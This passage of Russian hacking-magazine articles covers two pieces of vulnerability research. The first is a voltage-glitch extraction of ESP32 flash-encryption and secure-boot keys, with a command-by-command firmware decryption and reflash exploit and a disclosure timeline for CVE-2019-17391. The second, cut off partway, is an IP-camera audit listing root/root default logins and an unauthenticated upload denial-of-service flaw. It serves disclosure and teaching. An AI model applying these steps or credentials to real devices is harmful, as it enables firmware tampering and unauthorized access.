ническом руководстве есть и глава, посвященная контроллеру eFuses (гла‐
ва 20). Этот контрол лер управляет массивами eFuses и содержит четыре бло‐
ка eFuses каждый длиной 256 бит (не все из них доступны):
 • EFUSE_BLK0 исполь зует ся исключительно для системных задач;
 • EFUSE_BLK1 содержит ключ флеш‐шифрования (Flash Encryption Key,
   FEK);
 • EFUSE_BLK2 содержит ключ безопасной загрузки (Secure Boot Key, SBK);
 • EFUSE_BLK3  частично  резервиру ется  под  кастомный  MAC‐адрес
   или полностью занят пользовательским при ложением.

Представление eFuses выглядит следующим обра зом.





                          Таб лица eFuses

Как видим, самые важные бло ки — это BLK1 и BLK2, которые хранят соот‐
ветственно FEK и SBK. От  переза писи  их защищают WR_DIS_BLK1
и WR_DIS_BLK2, а от чтения — RD_DIS_BLK1 и RD_DIS_BLK2.


БЕЗОПАСНАЯ ЗАГРУЗКА
Бе зопасная загрузка (Secure Boot) стоит на стра же подлинности и целос‐
тности прошив ки, которая хранится во внеш ней флеш‐памяти типа SPI. Ата‐
кующему ничего не сто ит изменить содержимое внешней флеш‐памяти
и запустить на ESP32 зловредный  код. Безопасная загрузка призвана
защитить от подобной модификации прошивки.
  Перед  запуском  прошивки  безопасная  заг рузка  создает  цепочку
доверия — от BootROM к загрузчику. Это гарантирует, что исполня емый
на устройстве код подлинный и не может быть изменен без подписи бинар‐
ников (для этого нужен секретный ключ). Неподписанные бинарники устрой‐
ство просто не запустит.


        WWW

                    •Исчерпывающая документация по безопасной
                            загрузке на сайте Espressif



Как это работает?
Безопасную загрузку обычно уста навлива ют еще на производстве, которое
считается безопасной средой.


Ключ безопасной загрузки (SBK) сохраняют в eFuses
Как мы уже говорили, у ESP32 есть OTP‐память, которая состоит из четырех
блоков по 256 eFuses (всего 1024 бит). Ключ безопасной загрузки (SBK)
вшивают в электронные предохранители блока BLK2 (256 бит) на производс‐
тве. Именно с его помощью в режиме AES‐256 ECB создается цепочка
доверия от BootROM к загрузчику — чтобы про верить пос ледний. Ключ нель‐
зя считать или модифициро вать — блок BLK2 защищен спе циальными
eFuses.
  Понятно, что такой ключ нужно хра нить в тай не — чтобы злоумышленник
не мог создать новый образ загрузчика, спо собный пройти верификацию.
Хорошо бы также присваивать каждому устройству уникальный ключ — чтобы
уменьшить масштаб катас трофы в случае, если один из SBK утечет или будет
дешифрован.


Пара ключей ECDSA
Во время производства вендор также генерит пару ключей ECDSA — сек‐
ретный и открытый. Первый хра нят в тайне. Второй включают в конец образа
загрузчика — он отвечает за проверку подписи в обра зах приложений.


Дайджест
На адрес 0x0 флеш‐памяти SPI вшивают 192‐байтный дайджест. На выходе
мы получаем 192 байт данных: 128 рандомных байт плюс содержательный
дайджест из 64 байт, вычисленных по хеш‐функции SHA‐512. Выглядит все
это так:


Digest = SHA‐512(AES‐256((bootloader.bin + ECDSA publ. key), SBK))


Остановимся на SBK
Исходя из уже сказанного, я решил сосредоточиться на SBK, который хранит‐
ся в eFuses блока BLK2. Если я его вычислю, то смогу под писать свой злов‐
редный загрузчик и избежать верификации ECDSA.


Настройка безопасной загрузки
Благодаря документации я знаю, что на новой плате ESP32 безопасную заг‐
рузку можно включить вручную:



  $ espefuse.py burn_key secure_boot ./hello_world_k1/secure‐bootloader‐
  key‐256.bin
  $ espefuse.py burn_efuse ABS_DONE_0


После перезагрузки можно увидеть представление eFuses, используя инстру‐
мент espefuse.py.





          Схе ма eFuses пос ле настройки безопасной загрузки

Безопасная загрузка включена  (ABS_DONE_0=1), и ее ключ (BLK2) больше
нельзя считать или переписать. А параметр CONSOLE_DEBUG_DISABLE был
прошит еще до того, как я получил плату. Теперь ESP32 удос товеряет заг‐
рузчик при каждом запус ке, затем софт верифицирует приложение и после
этого исполняет код.


ФЛЕШ-ШИФРОВАНИЕ
Флеш‑шифрование (Flash Encryption) — функция для шиф рования содер‐
жимого встроенной в ESP32 SPI‐флешки. Когда флеш‐шифрование акти‐
вировано, мы не можем получить дос туп к большей час ти контента, просто
физически считав SPI‐носитель.
   Если активировать эту функцию, то по дефолту шифруются:
 • загрузчик;
 • таблица разделов;
 • раздел приложений.

Другие типы дан ных могут быть зашифрованы в зависимос ти от условий:
 • дайджест загрузчика Secure Boot (если включена безопасная загрузка);
 • любые разделы, помеченные в таб лице раз делов флагом encrypted.


        WWW

                     •Полная документация по функции Flash Encryp‐
                                tion на сайте Espressif



Как это работает?
Как и безопасная загрузка, флеш‐шифрование обычно прошивается еще на
производстве, которое считается безопас ной средой.

Ключ флеш‑шифрования (FEK) сохраняют в eFuses
Все то же самое: OTP‐память ESP32, сос тоящая из четырех блоков по 256
eFuses, всего 1024 бит. Ключ флеш‐шифрования (FEK) вшивается в блок
электронных предох ранителей BLK1. Содержимое флеш‐памяти шифруется
с помощью AES‐256.
  Ключ флеш‐шифрования хра нится в eFuses внутри чипа и защищен
от программного доступа. Его нельзя счи тать или модифицировать — за это
отвечают защитные eFuses.

Флеш‑шифрование с помощью AES-256
Флеш‐шифрование использует алгоритм AES‐256, при котором ключ «кор‐
ректируется» смещением каждого 32‐байтно го бло ка флеш‐памяти. Это зна‐
чит, что каждый 32‐байтный блок (два пос ледова тельных 16‐байтных AES‐
блока) шифруется  уникальным ключом,  основанным  на общем ключе
флеш‐шифрования   (FEK).   Прозрачность   доступа   к   флеш‐памяти
в ESP32 обеспечивает функция отоб ражения флеш‐кеша: любые области
флеш‐памяти, сопоставлен ные с адресным пространством, при  чтении
понятным образом дешифруются.


Остановимся на FEK
Итак, теперь я решил сосредоточиться на FEK, который хранится в eFuses
блока BLK1. Заполучив его, я смогу зашифровать новый загрузчик или рас‐
шифровать всю прошивку, что тоже неп лохо.

Вре мя настро ить флеш‑шифрование
Для начала я сге нерировал свой собственный ключ и прошил его в BLK2:



  $ espsecure.py generate_flash_encryption_key my_flash_encryption_key.bin


  $ hexdump my_flash_encryption_key.bin
  0000000 c838 e375 7633 1541 5ff9 4365 f2dd 2ce9
  0000010 1f78 42a0 bf53 8f14 68ce 009f 5586 9b52


  $ espefuse.py ‐‐port /dev/ttyUSB0 burn_key flash_encryption my_flash_en‐
  cryption_key.bin
  espefuse.py v2.7‐dev
  Connecting......
  Write key in efuse block 1. The key block will be read and write pro‐
  tected (no further changes or readback). This is an irreversible opera‐
  tion.
  Type 'BURN' (all capitals) to continue.
  BURN
  Burned key data. New value: 9b 52 55 86 00 9f 68 ce 8f 14 bf 53 42 a0 1f
  78 2c e9 f2 dd 43 65 5f f9 15 41 76 33 e3 75 c8 38
  Disabling read/write to key efuse block...


Затем назначил ответственные за активацию флеш‐шифрования eFuses:


  $ espefuse.py burn_efuse FLASH_CRYPT_CONFIG 0xf $ espefuse.py burn_efuse
  FLASH_CRYPT_CNT


Для чтения eFuses также годится команда dump:



  $ espefuse.py ‐‐port /dev/ttyUSB0 dump
  espefuse.py v2.7‐dev
  Connecting....
  EFUSE block 0:
  00130180 bf4dbb34 00e43c71 0000a000 00000430 f0000000 00000054
  EFUSE block 1:
  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
  EFUSE block 2:
  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
  EFUSE block 3:
  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000


По результатам моего реверса в зна чении EFUSE block0 первое 32‐битное
слово соответствует нас тройкам безопасности:


00130180 = 00000000 00010011 00000001 10000000

Две единицы в конце вто рого сег мента относятся к eFuses, которые защища‐
ют BLK2 и BLK1 от чтения. Любые попытки про честь BLK1 или BLK2 воз вра‐
щают 0x00.
  В итоге настрой ки безопас ности ESP32 выглядят так.





  Сводка eFuses при максимальных настройках безопасности. Флеш‐шиф‐
  рование и безопасная загрузка включены. BLK1 и BLK2 защищены
  от чтения и перезаписи


ТЕСТИРУЕМ ПРИЛОЖЕНИЕ В РЕЖИМЕ ПОЛНОЙ БЕЗОПАСНОСТИ
ESP32
Для  максимальной  безопас ности  Espressif  рекомендует  использовать
как безопасную загрузку, так и флеш‐шифрование. Включим обе функции
и протестим их с помощью специально скомпилированного и прошитого при‐
ложения.


Компилиру ем тестовое приложе ние
Тестовое приложе ние можно запилить прос тым main.c, например:


void app_main() {
    while(1) {
        printf("Hello from SEC boot K1 & FE !\n");
        vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
}

Для компиляции я активирую безопасную загрузку и флеш‐шифрование
с помощью make menuconfig.


Про шиваем тестовое приложе ние
Все образы подписаны, зашифрованы и один за другим прошиты в память
ESP32 (я делаю это вручную, чтобы получить максимум информации о про‐
цессе флеш‐шифрования):



  $ espsecure.py encrypt_flash_data ‐k ../../my_flash_encryption_key.bin ‐
  o bootloader‐reflash‐digest‐encrypted.bin ‐a 0x0 bootloader‐reflash‐di‐
  gest.bin


  $ python /home/limited/esp/esp‐idf/components/esptool_py/esptool/esp‐
  tool.py ‐‐chip esp32 ‐‐port /dev/ttyUSB0 ‐‐baud 115200 ‐‐before default‐
  _reset ‐‐after hard_reset write_flash ‐z ‐‐flash_mode dio ‐‐flash_freq
  40m ‐‐flash_size detect 0x0 /home/
  limited/esp/hello_world_k1_FE/build/bootloader/bootloader‐reflash‐di‐
  gest‐encrypted.bin


  $ espsecure.py encrypt_flash_data ‐k ../my_flash_encryption_key.bin ‐o
  hello‐world‐encrypted.bin ‐a 0x10000 hello‐world.bin


  $ espsecure.py encrypt_flash_data ‐k ../my_flash_encryption_key.bin ‐o
  partitions_singleapp‐encrypted.bin ‐a 0x08000 partitions_singleapp.bin


  $ python /home/limited/esp/esp‐idf/components/esptool_py/esptool/esp‐
  tool.py ‐‐chip esp32 ‐‐port /dev/ttyUSB0 ‐‐baud 115200 ‐‐before default‐
  _reset ‐‐after hard_reset write_flash ‐z ‐‐flash_mode dio ‐‐flash_freq
  40m ‐‐flash_size detect 0x10000
  /home/limited/esp/hello_world_k1_FE/build/hello‐world‐encrypted.bin
  0x8000 /home/limited/esp/hello_world_k1_FE/build/partitions_singleapp‐
  encrypted.bin


Ну что ж, сработало как по волшебс тву. Вот что показы вает лог UART
при включении:



  ets Jun  8 2016 00:22:57
  rst:0x1 (POWERON_RESET),boot:0x13 (SPI_FAST_FLASH_BOOT)
  configsip: 0, SPIWP:0xee
  clk_drv:0x00,q_drv:0x00,d_drv:0x00,cs0_drv:0x00,hd_drv:0x00,wp_drv:0x00
  mode:DIO, clock div:2
  load:0x3fff0018,len:4
  load:0x3fff001c,len:5548
  load:0x40078000,len:0
  load:0x40078000,len:21468
  entry 0x40078680
  I (920) cpu_start: Pro cpu up.
  I (920) cpu_start: Starting app cpu, entry point is 0x40080e44
  I (0) cpu_start: App cpu up.
  I (923) heap_init: Initializing. RAM available for dynamic allocation:
  I (930) heap_init: At 3FFAE6E0 len 00001920 (6 KiB): DRAM
  I (936) heap_init: At 3FFB29A8 len 0002D658 (181 KiB): DRAM
  I (942) heap_init: At 3FFE0440 len 00003BC0 (14 KiB): D/IRAM
  I (949) heap_init: At 3FFE4350 len 0001BCB0 (111 KiB): D/IRAM
  I (955) heap_init: At 40088B50 len 000174B0 (93 KiB): IRAM
  I (961) cpu_start: Pro cpu start user code
  I (308) cpu_start: Starting scheduler on PRO CPU.
  I (0) cpu_start: Starting scheduler on APP CPU.
  Hello from SEC boot K1 & FE !
  Hello from SEC boot K1 & FE !
  Hello from SEC boot K1 & FE !


Про веряем содержимое флеш‑памяти
Чтобы убедиться, что про шивка зашифрована, я сдампил все содержимое
флеш‐памяти:



  $ esptool.py ‐p /dev/ttyUSB0 ‐b 460800 read_flash 0 0x400000 flash_con‐
  tents.bin


Как и ожидалось, ничего не понятно.





     Первые строки ﬂash_contents.bin (без сомнения, зашифрованные)


ПОРА ВЗЛАМЫВАТЬ!
Ты можешь спросить: так, погоди‐ка, а где здесь уяз вимость? И будешь прав:
пока уязвимости мы не обна ружили. Но…


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
              ESP32 ВЗЛАМЫВАЕМ
     РАЗ И НАВСЕГДА
         ИЗВЛЕЧЕНИЕ КЛЮЧЕЙ ФЛЕШ‐ШИФРОВАНИЯ
                     И БЕЗОПАСНОЙ ЗАГРУЗКИ





Черный ящик
Я поставил резистор на 1 Ом (подключен к осциллографу) на VDD_RTC, чтобы
проверить, что происходит с мощностью во время загрузки ESP32. Прос той
анализ мощности — полезный метод для реверса аппаратной обработки.





  Анализ аппаратной активнос ти ESP32 во время загрузки: 1 — передатчик
  UART TX; 2 — 3,3‐вольтовый VDD (триггер); 3 — рас ход энергии; 4 —
  импульсная команда

Я быстро нашел чисто аппаратную обра ботку длиной в 500 мкс — до начала
строки ets June 2018, соот ветству ющей про цес су BootROM.
   Эта аппарат ная активность — наверняка ини циализация контроллера
eFuses и загрузка значений eFuses в специаль ную буферную память. Оттуда
флеш‐контроллер будет извлекать эти значения на сле дующих этапах.
  Проверим мое предположение.


Го товим обо рудо вание
Тестировать будем с помощью платы LOLIN. Выставим режим максимальной
безопасности ESP32 (безопасная загрузка + флеш‐шифрование).





               Девкит LOLIN (10 долларов на Amazon)


Модифициру ем плату
Я модифицировал плату, чтобы одновременно управлять VDD_CPU и VDD_RTC.





           Готовим одновременный сбой VDD_CPU и VDD_RTC


Настройка обо рудо вания





  Вся система обо рудования, которым мы будем сбивать напряжение
  в ESP32

Для скриптов и син хронизации всех час тей я исполь зовал Python.


Ре жим загрузки и коман да dump
Для нашего эксперимента я установил на ESP32 режим загрузки (IO0 подклю‐
чен к GND). Применяю команду dump, о которой мы уже говори ли:



  $ espefuse.py ‐‐port /dev/ttyUSB0 dump
  espefuse.py v2.7‐dev
  Connecting....
  EFUSE block 0:
  00130180 bf4dbb34 00e43c71 0000a000 00000430 f0000000 00000054
  EFUSE block 1:
  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
  EFUSE block 2:
  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
  EFUSE block 3:
  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000



Ре зультат
Используем обнаруженный нами период аппаратной обработки (до загрузки
BootROM), чтобы обрушить напряжение на VDD_CPU и VDD_RTC. Если мы
успешно считали защищенные от чтения и записи eFuses, экран осциллог‐
рафа выглядит вот так.





  Точное время ранней загрузки, когда мы отключаем защиту от чте ния
  в контроллере eFuses. 1 — передат чик UART TX; 2 — 3,3‐вольтовый VDD
  (триггер); 3 — расход энергии; 4 — импульсная команда

Во‐первых, мы сдампили ключ флеш‐шифрования:



  ‐‐‐‐‐ Efuses reading 40 ‐‐‐‐‐ Pulse delay = 0.001191230
  espefuse.py v2.7‐dev
  Connecting....
  EFUSE block 0:
  00120300 bf4dbb34 00e43c71 0000a000 00000430 f0000000 00000054
  EFUSE block 1:
  8655529b ce689f00 56bf288f 781fa042 ddf2e958 f25f6543 33764115 38c875e3
  EFUSE block 2:
  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
  EFUSE block 3:
  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000001


Во‐вторых, ключ безопасной загрузки тоже наш:



  ‐‐‐‐‐ Efuses reading 19 ‐‐‐‐‐ Pulse delay = 0.001190600
  espefuse.py v2.7‐dev
  Connecting....
  EFUSE block 0:
  001100c0 bf4dbb34 00e43c71 00000000 00000430 f0000000 00000054
  EFUSE block 1:
  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
  EFUSE block 2:
  e94f5bc2 00370f91 7c897429 2eadd23b c7664f05 5ae3365f d3781029 82e25c4c
  EFUSE block 3:
  00000000 00000000 00800000 00000000 00000000 01000000 00000000 00000080



Фатальный PoC





             Оригинальный PoC, отправленный вендору


Один шаг до пол ного раскры тия ключей
К сожалению, некото рые байты в полученных выше значениях ошибочны.
Вероятно, это связано с помеха ми во время ини циализации контрол лера
eFuses — сложно сказать точнее без дос тупа к конфиденциальной информа‐
ции о разработке.
  После короткого сеанса сбо ев в логе оста лось 30 сброшенных значений,
но ни одно из них не совпадает с реальным клю чом в точности. Требуется
небольшой статистический ана лиз. Я написал питоновский скрипт, чтобы
вычислить ключ безопасной заг рузки по 30 сброшенным ключам.





    Вычисление пол ного SBK по предыдущим сброшенным значениям

Примечание: здесь ана лизируется только SBK, но FEK тоже можно вычис‐
лить этим способом.
  При реальном взло ме (то есть без зна ния ключа) брутфорсить приходится
только последний байт. То же относит ся и к FEK. Заб рутфорсить SBK можно,
сравнивая дайджесты на шине 0x80 флеш‐памяти. Для FEK пригодится
команда fw‐decryption. Не так уж слож но.


Пол ный и окон чательный экспло ит
Ниже описано, как навеки загрузить код экс плоита в «полностью защищенный
ESP32»:


# Дампишь зашифрованную прошивку из режима загрузки (или через
считывание флеш‐памяти)
$ esptool.py ‐p /dev/ttyUSB0 ‐b 460800 read_flash 0 0x400000 flash_
contents.bin


# Дампишь FEK и SBK с помощью сбоя напряжения (как описано выше)
# Запускаешь статистический анализ по 30–50 полученным значениям


# Дешифруешь прошивку, используя реальный FEK (однобайтовый брутфорс)
$ espsecure.py decrypt_flash_data ‐‐keyfile my_dumped_fek.bin
‐‐output decrypted.bin ‐‐address 0x0 flash_contents.bin


# Извлекаешь bootloader.bin из расшифрованной прошивки, начиная с
0x1000, размер загрузчика может разниться (здесь 0x69F0)
$ dd if=decrypted.bin of=bootloader.bin bs=1 skip=$((0x1000)) count=
$((0x69F0))


# Извлекаешь iv.bin (первые 128 рандомных байт по адресу 0x00 в
дешифрованной прошивке)
$ dd if=decrypted.bin of=iv.bin bs=1 count=$((0x80))


# Вычисляешь подлинный дайджест, используя реальный SBK (
однобайтовый брутфорс), и сравниваешь с оригинальным дайджестом по
адресу 0x80 в дешифрованной прошивке (64 байт)
$ espsecure.py digest_secure_bootloader ‐‐keyfile my_dumped_sbk.bin
‐‐iv iv.bin bootloader.bin


# Вставляешь бинарники FEK и SBK в рабочую область
# Пишешь код
# Компилируешь образы с помощью sdkconfig (используя FEK и SBK)
# Заливаешь новую зашифрованную и подписанную прошивку
# Откидываешься в кресле: ты только что обошел безопасную загрузку и
флеш‐шифрование навеки

А еще, когда пишешь файлы ключей, важно помнить о порядке байтов. Пос‐
мотри на эти примеры.



           Реальный FEK. Нужно соблюдать порядок байтов




            Реальный SBK. И здесь порядок байтов важен


ЗАКЛЮЧЕНИЕ
Целью этого исследова ния была платформа ESP32 в режиме «пол ной
безопасности» (флеш‐шифрование плюс безопас ная загрузка). Это мак‐
симальный уровень защиты, рекомендованный Espressif.
  Однако  я  смог  полностью  считать ключи флеш‐шиф рования  (FEK)
и безопасной загрузки (SBK), взло мав защиту от чтения скачком напряжения.
Этот эксплоит позволяет атакующему расшифровать зашифрованную про‐
шивку — ведь теперь у него есть AES‐ключ флеш‐шифрования.
  В худшем случае зло умышленник может подделать прошивку (используя
SBK), зашифровать ее с помощью FEK и заменить оригинальную прошивку
навсегда. Такой взлом невозможно про пат чить без ревизии железа.


Тай млайн
 • 24.07.2019: Я отправил Espressif письмо с PoC.
 • 29.07.2019: Espressif признает уяз вимость и предлагает внести ее в CVE.
 • 05.09.2019: Espressif просит 100 дней на ответственное рас крытие.
 • 11.10.2019: Espressif анонсиру ет уязвимость CVE‐2019‐17391.
 • 01.11.2019: Новое руководство по безопасности от Espressif.
 • 13.11.2019: Публикация этой статьи в блоге.



Из‐за низкой сложности ата ку довольно легко воспро извести. По моему мне‐
нию, опытному хакеру для это го понадо бится мень ше одного дня и оборудо‐
вание меньше чем на 1000 баксов.
  Абсолютно все ESP32 уязвимы — речь идет о десятках миллионов уже
действующих девайсов. И пока мы тут раз говариваем, устройства с этой уяз‐
вимостью продолжают продаваться.


        WWW

                      •Блог автора
                       •Твиттер автора
ВЗЛОМ
ВСКРЫТАЯ
 КАМЕРА





       КАК ИСКАТЬ УЯЗВИМОСТИ
   В «УМНЫХ» ГАДЖЕТАХ НА ПРИМЕРЕ
       ПОПУЛЯРНОЙ IP‐КАМЕРЫ




За последние несколько  лет все чаще
обсуждается   проблема   безопасности
домашних гаджетов. На слуху атаки бот‐
нетов типа Mirai, которые поражают мил‐
лионы устройств и вредят как домаш ним        Илья Шапошников                                                                                     Эксперт в RedTeam, ПАО
пользователям,  так и бизнесу. Этичные       Ростелеком.им. Баумана.СтудентКапитанМГТУ
хакеры тоже исследуют все больше девай‐       командывузовскийInvulsCTF‐командыи участник
сов — обычно с неутешительными вывода‐           drakylar@gmail.comSFT0.
ми. В этой статье я покажу все эта пы про‐
верки хардвер ной безопасности на при‐
мере распространенной в России модели
IP‐камеры. Спойлер:  уязвимостей  будет
много.


             INFO

                       Этот текст основан на моем док ладе Oldschool
                    Way of Hacking Microdigital IP‐cameras, с которым
                        я выступил на ZeroNights 2019. Многие просили
                     меня прислать слайды, и я решил, что статья
                        с разбором всех уяз вимостей будет еще полез‐
                         нее.


Итак, моей задачей было выб рать такого производителя, который, с одной
стороны, давно присутствует на рос сийском рынке, с другой — еще не прив‐
лекал внимание специалис тов по безопасности. Мой выбор пал на корейскую
фирму Microdigital, которая про изво дит IP‐камеры.
   Сайт компании обещает нам широкий ассортимент: «свыше 30 моделей
регистраторов, свыше 150 моделей видеока мер». Отлично!





Компания существует на рынке (в том числе и российском) уже больше две‐
надцати лет, а это значит, что ее продукция распространена. Оказалось даже,
что в 2011 году был заключен договор на оснащение более 30 тысяч россий‐
ских автобусов камерами этой фирмы.
  В первую очередь меня заинтересовали устройства серии N, они дос‐
таточно продвинутые, но при этом пока что не ста ли объектом тестирования
кого‐то из иссле дователей. Пора исправить это! Я выбрал модель MDC‐
N4090W, которая предназна чена для использования внутри помещений. Под‐
робную информацию об устройстве можно почерпнуть на сайте произво‐
дителя.





                 Картинки по зап росу MDC‐N4090W


ИЗУЧЕНИЕ КАМЕРЫ
Начинать любое исследование железа лучше всего с изучения дос тупной
документации.





Открываем PDF, полученный на сайте Microdigital, и узнаем, что у камеры есть
веб‐интерфейс с поль зователями root (пароль root) и anonymous.





Ну и раз уж мы на сайте компании, прихватим  акту альную прошивку
для камеры. Дол го искать не приш лось, она дос тупна в соответс твующем
разделе.





Не факт, правда, что в прошивке содержится вся нужная для тестирования
информация, поэтому смысл ее изучать будет, толь ко если нет полноценного
админского доступа в консоль устройства либо ког да надо изу чить апдейт.
Поэтому не будем сейчас тра тить время и вернемся к прошивке позже.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   ВСКРЫТАЯ КАМЕРА
                          КАК ИСКАТЬ УЯЗВИМОСТИ
                 В «УМНЫХ» ГАДЖЕТАХ НА ПРИМЕРЕ
                       ПОПУЛЯРНОЙ IP‐КАМЕРЫ





ПОДГОТОВКА УСТРОЙСТВА К ТЕСТИРОВАНИЮ
Приступим к изучению аппаратной составляющей. Для этого раз бираем
устройство (ничего сложного, четыре вин та по периметру) и получаем печат‐
ную плату.





Также видим следующее:
 • память S34ML01G100TF100;
 • чип DM368ZCE;
 • интерфейсы: четыре пина UART, USB, MicroSD, Ethernet.

Пины, отмеченные как BLE, я не рас сматриваю, так как это, скорее всего, кон‐
такты для подключения модуля Bluetooth. Нас это в данный момент не инте‐
ресует.
  Модуль S34ML01G100TF100 — энергонеза виси мая NAND‐память в кор‐
пусе TSOP‐48. Datasheet легко гуглится. Из него узнаем подробнее о типе
корпуса (NAND08) и размере хра нилища — 128 Мбайт.
  Для дальнейшей работы потребуется сделать бэкап данных, чтобы в слу‐
чае «окирпичивания» камеры можно было вернуть ее в изначальное сос‐
тояние.   Для   этого   идеально   подходит   программатор   ProMan
TL86 или TL866 с переходником NAND08 → DIP48.
  Содержимое флеш‐памяти сохраним в нашу рабочую директорию. Как и
к прошивке, возвращать ся к ней нужно будет только в том слу чае, если
не выйдет дорваться до админской консоли.





                      Картинки по запросу tl86

Для чипа DM368ZCE тоже не сос тавило проб лем нагуглить документацию
(PDF). Оказывается, архитектура чипа — ARM. К тому же из документации
можно достать его распиновку, но нам она не потребу ется.





Пройдемся по интерфейсам. Из документации очевидно, что USB и MicroSD
нужны в основном для того, чтобы подключать к устрой ству внешние носители
и использовать их в качес тве хранилища. Для полноты картины можем под‐
клю чить к устройству USB‐фаз зер facedancer21 и, используя утилиту umap2s‐
can, получить список поддерживаемых устрой ств.





К сожалению, камера не поддерживает ни одно из известных нам устройств.
   Как насчет UART? Тут предстоит определить, за что отвечает каждый пин
и какова скорость переда чи данных. Для этого вос пользуемся логическим
анализатором Saleae Logic. Для удобства я подклю чился через проводок,
который соединяет плату устройства и инфракрасные лампочки.





Пронумеруем пины для удобства.





Прежде чем вклю чать логичес кий ана лизатор, подклю чаем заземление к пину
GND интерфейса для подключения BLE.





Теперь вклю чаем логичес кий ана лиза тор и само устрой ство и смотрим, что
из этого выйдет.





После вклю чения устройства на пине номер 3 (в программе отсчет идет
с нуля и пин нумерован как 2) передаются бинарные данные. Этот пин
интерфейса UART отвечает за передачу данных (TX). Просмотрев длину одно‐
го бита, получаем текущую скорость передачи — 115 200 бит/с. При коррек‐
тных настройках мы даже можем раз глядеть часть текста.





У пина под номером 1 пос тоянное напряжение 3 В — следовательно, он
предназначен для питания. Пин номер 4 свя зан с пином GND интерфейса
для подключения модуля BLE. Зна чит, этот пин тоже «земля». И остается пос‐
ледний пин под номером 2, он отвечает за прием байтов (RX). Теперь у нас
есть вся информация для общения с камерой по UART. Для подключения я
воспользуюсь Arduino UNO в режиме переходника TTL.





Начинаем монито рить порт UART и получа ем следующее.





При старте устройства первым делом подгру жает ся загрузчик сис темы U‐
Boot. К сожалению, на уровне загрузки пин TX отклю чен в настрой ках камеры,
поэтому мы можем наб людать только отладочный вывод. Через какое‐то вре‐
мя подгружается основная система, поз воляющая ввести логин и пароль
для доступа в администраторскую консоль. Пара root/root (аналогичная той,
что используется для веб‐админки и указана в документации) прекрасно
подошла.





Получив консоль, мы можем изучить все работающие сервисы. Но не забыва‐
ем, что у нас есть еще один неизученный интерфейс — Ethernet. Для его
исследования нужно будет подготовить систему мониторинга трафика. При‐
чем важно отслеживать первое же подключение к сети.


             INFO

                Мы должны начать перехватывать трафик сразу,
                       поскольку некото рые устройства при первом под‐
                     ключении   начинают   скачивать   обновления.
                    Не факт, что в следующие разы получится перех‐
                         ватить коммуникации.


Для перехвата трафика я буду пользоваться устройством Lan Tap Pro.





Никакой связан ной с обновлениями активности мы, впрочем, не обнаружи‐
ваем. На этом разведка закончена, и мы полностью готовы к поиску уяз‐
вимостей!


СЕТЕВАЯ ЧАСТЬ
Просканируем пор ты утилитой Nmap и получим список откры тых портов.





Пройдемся вкратце по доступным нам сервисам.


FTP
При подклю чении сер вис запрашивает логин и пароль. Анонимный вход
отключен. Но и тут подошел вариант root/root!





Теперь мы можем заходить в любую директорию и получи ли удобный способ
закидывать файлы на удален ный хост.


Telnet
При подклю чении по Telnet опять же требует ся логин и пароль одного
из реальных аккаунтов и уже не в первый раз подходит пара root/root. Обрати
внимание, что нам теперь не нужна консоль UART, так как все то же самое
можно делать удален но по Telnet.





RTSP
Для подключения к RTSP опять же нужно авторизоваться как root/root. Ссылка
для подключения принимает вид rtsp://root:root@192.168.1.151:554/
Primary.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   ВСКРЫТАЯ КАМЕРА
                          КАК ИСКАТЬ УЯЗВИМОСТИ
                 В «УМНЫХ» ГАДЖЕТАХ НА ПРИМЕРЕ
                       ПОПУЛЯРНОЙ IP‐КАМЕРЫ





Веб
Изучив устройство веб‐сервера камеры, я составил вот такую схему.





На сервере находятся скрипты на PHP и CGI‐приложения, которые общаются
с исполняемыми файлами из директории /usr/local/ipsca/ (преимущес‐
твенно общение идет с MainProc). Для хранения всех настроек используется
база данных SQLite 3.
  С нее‐то мы и начнем искать уяз вимости. База данных хранится в /usr/
local/ipsca/mipsca.db. В ней лежит все — от логов системы до нас троек
автоматической загрузки записей камеры на удаленный сервер. Структура
базы данных видна на скрине ниже.





Мое внимание привлекла таблица User. Она отвечает за работу с данными
пользователей: логин, пароль, привилегии.





Пароль пользователя хра нится в колонке Password в незашифрованном виде,
то есть, получив доступ к базе данных, злоумыш ленник может узнать пароль
администратора и протес тировать его на дру гих дос тупных сервисах.
  Переходим к скриптам на PHP. В веб‐директории /root/httpd/htdocs/
Web лежит три скрипта: download.php, login.php, upload.php.





Файл login.php не особенно интересен, так как PHP тут используется только
для настройки компонента ActiveX, нужного для браузерных допол нений,
которые стримят видео на сайте.





Файл download.php принимает на вход название файла для скачивания, про‐
веряет его расширение и, если такой файл най дется в папке updownload,
отправляет в ответ его содержимое.
  В скрипте нет проверки наз вания файла, так что если кто‐то вдруг решит
положить в этот каталог исполня емый скрипт на PHP, то его содержимое
при запросе будет скачивать ся (обрати внимание на переменную $file_‐
type, которая будет пустой в случае неизвес тного рас ширения).





Последний файл — upload.php тоже оказал ся не без багов: в нем есть воз‐
можность отправлять файлы не только с расширени ем из белого списка (.dat
и .DAT), но и с пустым расширением.
  Вайтлист расширений задается следующей строкой.





Теперь,  если  значение  расширения  не  пус тое,  проводится  проверка
на наличие расширения в мас сиве, который получен из $allowExt. В качес‐
тве разделителя используется запятая.





Но если расширение пустое, исполнение не дой дет до этого условия и про‐
верка не выполнится. Одна ко для экс плуатации этот баг бесполезен.
  А вот следующий случайно найденный баг этого скрипта уже стоит рас‐
ценить как уязвимость: здесь отсутс твует проверка на длину названия файла.
Казалось бы, не очень серьезная проб лема, но в начале программы запус‐
кается скрипт на Bash.





Он очищает директорию updownload от ранее загруженных туда файлов, а в
интерпретаторе Bash, который входит в BusyBox, стоит ограничение на длину
названия файла в 256 символов. Получается, что скрипт не сможет удалить
файлы, названия которых длиннее это го значения.
   Так как у upload.php нет никакой авторизации, любой пользователь может
загрузить сколько угодно файлов с именем длиннее 256 символов, и это при‐
ведет  к заполнению всей памяти устройства. Другими словами,  Denial
of Service.
  Пример загрузки файла.





